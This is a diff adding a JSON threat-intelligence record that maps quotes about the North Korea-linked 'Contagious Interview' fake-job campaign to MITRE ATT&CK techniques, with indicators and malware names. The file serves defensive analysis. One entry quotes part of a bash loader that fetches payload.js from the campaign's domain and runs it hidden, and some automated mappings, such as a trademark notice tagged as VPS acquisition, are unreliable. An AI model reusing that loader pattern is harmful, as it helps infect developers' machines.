+          "url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1590.005",
+        "name": "Gather Victim Network Information: IP Addresses",
+        "parent_id": "T1590",
+        "url": "https://attack.mitre.org/techniques/T1590/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0074",
+      "confidence": "medium",
+      "description": "“Related: FBI Seizes 13 Websites That Officials Say Were Used by China to Target and Recruit US Workers Related: North Korean Hackers Deploy New Linux Espionage Toolkit Related: North Korean Hackers Target Open Source Developers in Supply Chain Attacks” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Japan Dismantles First North Korean Laptop Farm as US and Allies Detail Wider Scheme",
+          "url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1195.002",
+        "name": "Supply Chain Compromise: Compromise Software Supply Chain",
+        "parent_id": "T1195",
+        "url": "https://attack.mitre.org/techniques/T1195/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0074",
+      "confidence": "medium",
+      "description": "“WaterPlum campaign overview WaterPlum poses as employers to reach software developers and IT professionals, often impersonating real AI, cryptocurrency or NFT companies.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Japan Dismantles First North Korean Laptop Farm as US and Allies Detail Wider Scheme",
+          "url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684.001",
+        "name": "Social Engineering: Impersonation",
+        "parent_id": "T1684",
+        "url": "https://attack.mitre.org/techniques/T1684/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0074",
+      "confidence": "low",
+      "description": "“The candidate applied through a VPN with a resume claiming more than ten areas of expertise each across programming languages, blockchain technologies and cloud services.” — SecurityWeek nation-state",
+      "provenance": {
+        "article_source": "SecurityWeek nation-state",
+        "article_url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "SecurityWeek nation-state: Japan Dismantles First North Korean Laptop Farm as US and Allies Detail Wider Scheme",
+          "url": "https://www.securityweek.com/japan-dismantles-first-north-korean-laptop-farm-as-us-and-allies-detail-wider-scheme/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "order": 10,
+          "shortname": "lateral-movement",
+          "url": "https://attack.mitre.org/tactics/TA0008"
+        }
+      ],
+      "technique": {
+        "id": "T1021.007",
+        "name": "Remote Services: Cloud Services",
+        "parent_id": "T1021",
+        "url": "https://attack.mitre.org/techniques/T1021/007"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "low",
+      "description": "“The accounts had disposable email addresses and nothing else.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0043",
+          "name": "Reconnaissance",
+          "order": 0,
+          "shortname": "reconnaissance",
+          "url": "https://attack.mitre.org/tactics/TA0043"
+        }
+      ],
+      "technique": {
+        "id": "T1589.002",
+        "name": "Gather Victim Identity Information: Email Addresses",
+        "parent_id": "T1589",
+        "url": "https://attack.mitre.org/techniques/T1589/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "medium",
+      "description": "“Domain accurasofthire[.]com was registered at Hostinger on 17 April 2026.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.001",
+        "name": "Acquire Infrastructure: Domains",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "medium",
+      "description": "“JFrog is a registered trademark of JFrog Ltd. in the United States.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-12",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.003",
+        "name": "Acquire Infrastructure: Virtual Private Server",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "medium",
+      "description": "“His GitHub account, oleksandr3201, was created on 19 June 2026, the month its LinkedIn profile was.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-12",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1583.006",
+        "name": "Acquire Infrastructure: Web Services",
+        "parent_id": "T1583",
+        "url": "https://attack.mitre.org/techniques/T1583/006"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "low",
+      "description": "“These commits were made with the owners' own push access.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0042",
+          "name": "Resource Development",
+          "order": 1,
+          "shortname": "resource-development",
+          "url": "https://attack.mitre.org/tactics/TA0042"
+        }
+      ],
+      "technique": {
+        "id": "T1608.001",
+        "name": "Stage Capabilities: Upload Malware",
+        "parent_id": "T1608",
+        "url": "https://attack.mitre.org/techniques/T1608/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "low",
+      "description": "“- Malicious npm packages:” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-12",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "order": 2,
+          "shortname": "initial-access",
+          "url": "https://attack.mitre.org/tactics/TA0001"
+        }
+      ],
+      "technique": {
+        "id": "T1195.002",
+        "name": "Supply Chain Compromise: Compromise Software Supply Chain",
+        "parent_id": "T1195",
+        "url": "https://attack.mitre.org/techniques/T1195/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "medium",
+      "description": "“That script downloads a second one and runs it with the execution policy bypassed; the second registers a native messaging host named com.accurasoft.jobalerts for Chrome and Edge in the user's registry, and offers a scheduled task that polls the site every five minutes with the…” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-12",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "order": 4,
+          "shortname": "persistence",
+          "url": "https://attack.mitre.org/tactics/TA0003"
+        },
+        {
+          "id": "TA0004",
+          "name": "Privilege Escalation",
+          "order": 5,
+          "shortname": "privilege-escalation",
+          "url": "https://attack.mitre.org/tactics/TA0004"
+        }
+      ],
+      "technique": {
+        "id": "T1053.005",
+        "name": "Scheduled Task/Job: Scheduled Task",
+        "parent_id": "T1053",
+        "url": "https://attack.mitre.org/techniques/T1053/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "high",
+      "description": "“What that fetches is a nine-line batch file: make a .nvm folder in the user's profile, download notification-bootstrap-win?flag=10 into it as bootstrap.cmd, start it hidden, clear the screen three times.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1059.003",
+        "name": "Command and Scripting Interpreter: Windows Command Shell",
+        "parent_id": "T1059",
+        "url": "https://attack.mitre.org/techniques/T1059/003"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "low",
+      "description": "“What makes the attack so interesting, beyond the more than $6 billion in stolen assets, is that, according to Binance, a key step was a fake job interview.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "order": 3,
+          "shortname": "execution",
+          "url": "https://attack.mitre.org/tactics/TA0002"
+        }
+      ],
+      "technique": {
+        "id": "T1204.002",
+        "name": "User Execution: Malicious File",
+        "parent_id": "T1204",
+        "url": "https://attack.mitre.org/techniques/T1204/002"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "low",
+      "description": "“Each rewrite keeps the owner's name and the original date and adds a hidden loader: in a config file, or as the VS Code task and fake font of the hijacked packages we started from.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-12",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1027.013",
+        "name": "Obfuscated Files or Information: Encrypted/Encoded File",
+        "parent_id": "T1027",
+        "url": "https://attack.mitre.org/techniques/T1027/013"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "low",
+      "description": "“Its repository was created on 5 August 2026 with a single commit, and the commit carries its author's name and address: From: Anton Goss Date: Wed, 5 Aug 2026 09:49:43 +0000 Subject: [PATCH] Initial commit GitHub credits that commit to the company's own account, accurasofthire,…” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-12",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1036.005",
+        "name": "Masquerading: Match Legitimate Resource Name or Location",
+        "parent_id": "T1036",
+        "url": "https://attack.mitre.org/techniques/T1036/005"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "medium",
+      "description": "“The macOS and Linux script is the same flow in bash, down to the nohup and the self-delete: SITE_URL=\"${ACCURASOFT_SITE:-hxxps://accurasofthire[.]com}\" PAYLOAD_URL=\"${SITE_URL%/}/camera-driver/payload.js\" ... nohup bash -c \"\\\"$NODE_EXE\\\" \\\"$PAYLOAD_JS\\\"; rm -f \\\"$PAYLOAD_JS\\\"\"…” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1070.004",
+        "name": "Indicator Removal: File Deletion",
+        "parent_id": "T1070",
+        "url": "https://attack.mitre.org/techniques/T1070/004"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "low",
+      "description": "“- Domains: accurasofthire[.]com (careers site and loader server)” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-12",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0005",
+          "name": "Stealth",
+          "order": 6,
+          "shortname": "stealth",
+          "url": "https://attack.mitre.org/tactics/TA0005"
+        }
+      ],
+      "technique": {
+        "id": "T1684.001",
+        "name": "Social Engineering: Impersonation",
+        "parent_id": "T1684",
+        "url": "https://attack.mitre.org/techniques/T1684/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "low",
+      "description": "“- Dead drop: Ethereum sender 0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a; stage paths /0x/cls and /0x/ls on port 443.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "similarity",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-12",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "order": 12,
+          "shortname": "command-and-control",
+          "url": "https://attack.mitre.org/tactics/TA0011"
+        }
+      ],
+      "technique": {
+        "id": "T1102.001",
+        "name": "Web Service: Dead Drop Resolver",
+        "parent_id": "T1102",
+        "url": "https://attack.mitre.org/techniques/T1102/001"
+      }
+    },
+    {
+      "attack_ref": "INC-0013",
+      "confidence": "medium",
+      "description": "“A recent multinational advisory finally revealed the massive scale of the operation: tens of thousands of infected devices globally and thousands of drained crypto wallets in less than a year.” — ORKL report library (backfill)",
+      "provenance": {
+        "article_source": "ORKL report library (backfill)",
+        "article_url": "https://research.jfrog.com/post/accurasofthire-fake-interview/",
+        "attack_version": "20.1",
+        "method": "rule",
+        "relationship_id": null,
+        "relationship_modified": null,
+        "reviewed_at": "2026-11-13",
+        "source": "reviewed-automap",
+        "via_group": null
+      },
+      "references": [
+        {
+          "citation": null,
+          "source_name": "ORKL report library (backfill): Contagious Interview - One Interview Away From Infection",
+          "url": "https://research.jfrog.com/post/accurasofthire-fake-interview/"
+        }
+      ],
+      "tactics": [
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "order": 14,
+          "shortname": "impact",
+          "url": "https://attack.mitre.org/tactics/TA0040"
+        }
+      ],
+      "technique": {
+        "id": "T1657",
+        "name": "Financial Theft",
+        "parent_id": null,
+        "url": "https://attack.mitre.org/techniques/T1657"
+      }
+    }
+  ],
+  "schema_version": "1.0",
+  "slug": "contagious-interview",
+  "software": [
+    {
+      "id": "S1246",
+      "name": "BeaverTail",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S1246"
+    },
+    {
+      "id": "S1249",
+      "name": "HexEval Loader",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S1249"
+    },
+    {
+      "id": "S1245",
+      "name": "InvisibleFerret",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S1245"
+    },
+    {
+      "id": "S1248",
+      "name": "XORIndex Loader",
+      "type": "malware",
+      "url": "https://attack.mitre.org/software/S1248"
+    }
+  ],
+  "stix_modified": "2026-07-31T18:47:53.854Z",
+  "tactics_present": [
+    {
+      "id": "TA0043",
+      "name": "Reconnaissance",
+      "order": 0,
+      "shortname": "reconnaissance",
+      "url": "https://attack.mitre.org/tactics/TA0043"
+    },
+    {
+      "id": "TA0042",
+      "name": "Resource Development",
+      "order": 1,
+      "shortname": "resource-development",
+      "url": "https://attack.mitre.org/tactics/TA0042"
+    },
+    {
+      "id": "TA0001",
+      "name": "Initial Access",
+      "order": 2,
+      "shortname": "initial-access",
+      "url": "https://attack.mitre.org/tactics/TA0001"
+    },
+    {
+      "id": "TA0002",
+      "name": "Execution",
+      "order": 3,
+      "shortname": "execution",
+      "url": "https://attack.mitre.org/tactics/TA0002"
+    },
+    {
+      "id": "TA0003",
+      "name": "Persistence",
+      "order": 4,
+      "shortname": "persistence",
+      "url": "https://attack.mitre.org/tactics/TA0003"
+    },
+    {
+      "id": "TA0004",
+      "name": "Privilege Escalation",
+      "order": 5,
+      "shortname": "privilege-escalation",
+      "url": "https://attack.mitre.org/tactics/TA0004"
+    },
+    {
+      "id": "TA0005",
+      "name": "Stealth",
+      "order": 6,
+      "shortname": "stealth",
+      "url": "https://attack.mitre.org/tactics/TA0005"
+    },
+    {
+      "id": "TA0112",
+      "name": "Defense Impairment",
+      "order": 7,
+      "shortname": "defense-impairment",
+      "url": "https://attack.mitre.org/tactics/TA0112"
+    },
+    {
+      "id": "TA0006",
+      "name": "Credential Access",
+      "order": 8,
+      "shortname": "credential-access",
+      "url": "https://attack.mitre.org/tactics/TA0006"
+    },
+    {
+      "id": "TA0007",
+      "name": "Discovery",
+      "order": 9,
+      "shortname": "discovery",
+      "url": "https://attack.mitre.org/tactics/TA0007"
+    },
+    {
+      "id": "TA0008",
+      "name": "Lateral Movement",
+      "order": 10,
+      "shortname": "lateral-movement",
+      "url": "https://attack.mitre.org/tactics/TA0008"
+    },
+    {
+      "id": "TA0011",
+      "name": "Command and Control",
+      "order": 12,
+      "shortname": "command-and-control",
+      "url": "https://attack.mitre.org/tactics/TA0011"
+    },
+    {
+      "id": "TA0010",
+      "name": "Exfiltration",
+      "order": 13,
+      "shortname": "exfiltration",
+      "url": "https://attack.mitre.org/tactics/TA0010"
+    },
+    {
+      "id": "TA0040",
+      "name": "Impact",
+      "order": 14,
+      "shortname": "impact",
+      "url": "https://attack.mitre.org/tactics/TA0040"
+    }
+  ]
+}
